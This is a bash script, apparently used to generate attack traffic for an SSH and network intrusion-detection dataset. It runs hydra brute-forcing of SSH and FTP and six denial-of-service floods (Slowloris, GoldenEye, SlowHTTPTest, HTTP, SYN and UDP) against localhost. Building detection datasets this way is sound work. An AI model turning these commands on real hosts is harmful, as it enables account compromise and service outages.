#!/bin/bash
# === TESTING ATTACK SCRIPT ===
# Digunakan untuk Skenario 1, 2, dan 3
# Jalankan 8 serangan ke localhost secara sequential
#
# Upload ke S3:
#   aws s3 cp testing-attack.sh s3://ssh-detection-features-232032302717/scripts/testing-attack.sh --region ap-southeast-1
#
# Di EC2 (via SSM):
#   aws s3 cp s3://ssh-detection-features-232032302717/scripts/testing-attack.sh /tmp/testing-attack.sh
#   chmod +x /tmp/testing-attack.sh
#   sudo /tmp/testing-attack.sh

echo "============================================================"
echo "  ATTACK TESTING — 8 Phases"
echo "  $(date)"
echo "============================================================"
echo ""

echo "[$(date +%H:%M:%S)] Phase 1/8: SSH-Bruteforce (60s)"
timeout 60 hydra -l testuser -P /opt/attack/passwords.txt -t 8 127.0.0.1 ssh 2>&1 | tail -2
sleep 3

echo "[$(date +%H:%M:%S)] Phase 2/8: FTP-BruteForce (60s)"
timeout 60 hydra -l testuser -P /opt/attack/passwords.txt -t 8 127.0.0.1 ftp 2>&1 | tail -2
sleep 3

echo "[$(date +%H:%M:%S)] Phase 3/8: Slowloris (60s)"
timeout 60 /opt/venv/bin/slowloris 127.0.0.1 -p 80 -s 200 2>&1 | tail -2
sleep 3

echo "[$(date +%H:%M:%S)] Phase 4/8: GoldenEye (60s)"
timeout 60 python3 /opt/GoldenEye/goldeneye.py http://127.0.0.1 -w 20 -s 50 2>&1 | tail -2
sleep 3

echo "[$(date +%H:%M:%S)] Phase 5/8: SlowHTTPTest (60s)"
timeout 60 slowhttptest -c 500 -H -i 10 -r 100 -t GET -u http://127.0.0.1/ -p 3 -l 60 2>&1 | tail -2
sleep 3

echo "[$(date +%H:%M:%S)] Phase 6/8: Hulk / HTTP Flood (60s)"
timeout 60 ab -n 50000 -c 200 http://127.0.0.1/ 2>&1 | tail -3
sleep 3

echo "[$(date +%H:%M:%S)] Phase 7/8: SYN Flood (10s)"
sudo timeout 10 nping --tcp --flags SYN --rate 3000 -p 80 -c 10000 127.0.0.1 2>&1 | tail -3
sleep 3

echo "[$(date +%H:%M:%S)] Phase 8/8: UDP Flood (10s)"
timeout 10 python3 /opt/attack/udp_flood.py 127.0.0.1 80 10 2>&1 | tail -1
sleep 3

echo ""
echo "============================================================"
echo "  ALL 8 ATTACKS COMPLETED — $(date +%H:%M:%S)"
echo "============================================================"
